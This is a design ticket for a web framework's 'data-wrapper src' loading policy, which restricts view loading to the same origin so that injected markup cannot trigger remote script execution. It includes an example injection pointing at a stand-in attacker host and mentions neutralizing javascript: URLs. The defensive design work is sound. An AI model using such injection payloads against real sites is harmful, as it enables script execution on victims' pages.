# Ticket 016: Trusted-source policy for `<data-wrapper src>`

## Status

COMPLETE for alpha — `<data-wrapper src>` is same-origin-only at runtime.
Configurable cross-origin / path-prefix policy is deferred to the post-alpha
roadmap.

## Problem

`load()` fetches a view URL and **executes** its `<script type="module"
data-module>` (blob URL + dynamic `import`). That makes `src` a code-execution
sink, not just a data fetch.

The danger is escalation: on a page with a strict CSP, an attacker who achieves
HTML injection normally finds `<script>` and inline handlers inert. But an
injected `<data-wrapper src="//attacker.example/x.html">` (or a same-origin
`src="/uploads/user.html"`) hands the framework a mandate to fetch and run code.
Inert markup injection becomes script execution.

CSP is **not** an available mitigation here: runtime import maps + blob module
composition require a permissive `script-src` (`blob:`, plus any shim CDN). A
`script-src` strict enough to stop the escalation also breaks the framework.
So the framework itself has to enforce a source policy.

Related fixes already landed (this review):
- `$innerhtml`/`$outerhtml` throw; raw HTML needs the named `$unsafeHTML`
  opt-in (`bind`, `PROP_ALIASES`).
- `javascript:`/`vbscript:` values are neutralized in URL attributes
  (`href`/`src`/`action`/`formaction`) in `setProp`.

This ticket covers the third and largest face: which URLs a wrapper may load.

## Design

A "trusted source" allowlist, enforced in `load()` / `loadChildWrapper` before
fetch. Model it on CSP's own trust story.

1. **Snapshot the policy once, at framework init.** Read it before any UGC can
   enter the DOM; a policy injected later must not be able to widen it. This is
   the security-load-bearing detail — without it, an attacker who can inject a
   `<data-wrapper>` can also inject a policy tag. Same rule CSP follows (policy
   must precede content).

2. **Policy source.** Deferred. Alpha enforces same-origin only. A later
   `<meta name="data-wrapper-src-policy" content="...">` or equivalent policy
   can add explicit cross-origin / path-prefix support if third-party views or
   UGC become target use-cases.

3. **Match granularity.** Alpha has exactly one rule: the resolved view URL must
   share the document origin. That kills `src="//attacker.example/…"`. It does
   not try to solve same-origin user-uploaded HTML, because UGC is out of scope
   for alpha.

4. **Enforcement.** Resolve `new URL(src, baseURI)`, test against the origin,
   and on violation **refuse to load + `console.error`** with attribution. A
   blocked src is hostile runtime data, not a dev-authoring mistake, so it does
   not throw the app down (consistent with the `javascript:`-scheme handling). A
   dev typo pointing outside the origin surfaces the same clear error.

## Decision (ratified)

**Default posture: Option B — same-origin (secure-by-default).** Cross-origin
`src` is not supported in the alpha runtime. The documented CDN *install* loads
the **framework** via `<script src>`, not a cross-origin `<data-wrapper src>`,
so this does not regress the install story.

This default is chosen out of *necessity*: the framework can't rely on a strict
CSP today (see below), so a same-origin default is the strongest posture we can
enforce ourselves without new platform work.

## Future direction: step up a tier (Trusted Types as the metric)

Same-origin-by-default is a framework-enforced allowlist standing in for a
platform control we can't currently use. The north star is to step up a tier so
the browser enforces the boundary directly and our allowlist becomes
defense-in-depth rather than the sole line.

The concrete, testable acceptance metric is **Trusted Types enforcement**
(`Content-Security-Policy: require-trusted-types-for 'script'`), now Baseline
2026. Under enforcement the browser throws a `TypeError` on any raw-string write
to an injection sink unless it passes through a named `TrustedTypePolicy`. That
replaces the vague "strict CSP" goal with a pass/fail conformance test.

data-wrapper does not run under enforcement today. It writes raw strings to four
Trusted-Types-protected sinks:
- `$unsafeHTML` → `Element.innerHTML` (TrustedHTML sink).
- `<iframe $srcdoc>` → `HTMLIFrameElement.srcdoc` (TrustedHTML sink).
- `importComponent` → the injected `<script type="importmap">.textContent`
  (TrustedScript sink).
- `loadShim` → `script.src` (TrustedScriptURL sink).

The step-up work routes each through a single framework `TrustedTypePolicy`, plus
a CSP story for the blob-module composition (real-URL or nonce/hash module
registration so `script-src` need not allow `blob:`). If none of these is a hard
wall — i.e. multi-import-maps are not unsafe by definition — this is worth its
own ticket, and the same-origin default becomes the belt to that CSP's
suspenders. Note this likely changes the authoring format: inline
`data-module` blocks become blob modules today, so an enforced mode would prefer
external module files (`<script type="module" data-module src="./x.js">`).

Strict authoring mode would change the component format. Inline
`<script type="module" data-module>` blocks would no longer be the default
authoring path, because the current runtime turns them into blob modules. A
strict mode would likely require external module files via
`<script type="module" data-module="..." src="./component.js">`, a static or
nonce-aware import-map story, and browser verification across the supported
matrix.

## Non-goals

- Not a CSP replacement; complements it where CSP can't be strict.
- No allowlist for the framework's own module import / import-map composition —
  that is trusted first-party config, not a per-wrapper UGC surface.

## Progress

Done:

- Option B is ratified: without an explicit policy, `<data-wrapper src>` should
  load same-origin views only.
- Runtime enforcement is implemented in `src/lib/element.ts` before `fetch()`.
- The document origin is snapshotted at framework initialization time.
- The technical info page now includes `views/info/security.html`, wired into
  `info.html`.
- The security info page measures the current posture against public standards:
  OWASP DOM-XSS guidance, CWE-79, CSP Level 3, and Trusted Types.
- The page documents the alpha threat model: developer-authored views and trusted
  bound data; UGC and third-party-loaded component views are out of scope until
  the 1.0 roadmap.
- The page documents existing sink protections: `$text`, blocked
  `$innerHTML` / `$outerHTML`, explicit `$unsafeHTML`, URL-scheme
  neutralization for the current URL attrs, and no string-eval event handling.
- The ticket now uses `$unsafeHTML` consistently.

Pending before this ticket is complete:

None for alpha.

Roadmap / not alpha-blocking:

- Configurable source policy for explicit trusted origins and path prefixes.
- UGC-safe rendering and sanitization policy.
- Third-party component view loading.
- CSS-injection hardening for hostile content.
- Trusted Types enforcement compatibility
  (`require-trusted-types-for 'script'`) as the 1.0 security metric.
- Strict-CSP-compatible authoring mode, likely with external module files and a
  nonce/static import-map story.

## Acceptance

- [x] Source origin snapshotted at init; a policy tag injected after load cannot
  widen it.
- [x] Same-origin `src` loads normally; cross-origin `src` is refused and logged.
- [x] `bun review` green; size stays within the ticket 015 budget:
  `dist/data-wrapper.js` 28,973 bytes raw, `dist/data-wrapper.min.js` 16,744
  bytes raw / 6,795 bytes gzip.
- [x] A `views/info/security.html` section (dogfooded) documents the policy, the
  `$unsafeHTML` opt-in, and the URL-scheme neutralization.
